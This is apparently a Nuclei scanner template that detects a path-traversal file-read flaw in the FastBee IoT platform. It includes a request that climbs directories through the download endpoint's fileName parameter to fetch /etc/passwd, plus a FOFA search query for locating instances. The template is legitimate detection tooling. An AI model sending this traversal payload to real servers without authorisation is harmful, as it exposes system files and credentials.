id: fastbee-arbitrary-file-read

info:
  name: FastBee - 本地文件包含漏洞
  author: s4e-io
  severity: high
  description: FastBee - 本地文件包含 存在本地文件包含漏洞。攻击者可借此读取服务器本地敏感文件、配置凭证或应用源码，为进一步入侵提供条件。
  reference:
    - https://blog.csdn.net/weixin_43167326/article/details/141806542
  metadata:
    verified: true
    max-request: 1
    vendor: fastbee
    product: fastbee
    fofa-query: "fastbee"
  tags: fastbee,iot,lfi,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(body,"<title>FastBee")'
          - 'status_code == 200'
        condition: and
        internal: true

  - raw:
      - |
        GET /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"

      - type: word
        part: content_type
        words:
          - 'application/octet-stream'

      - type: status
        status:
          - 200
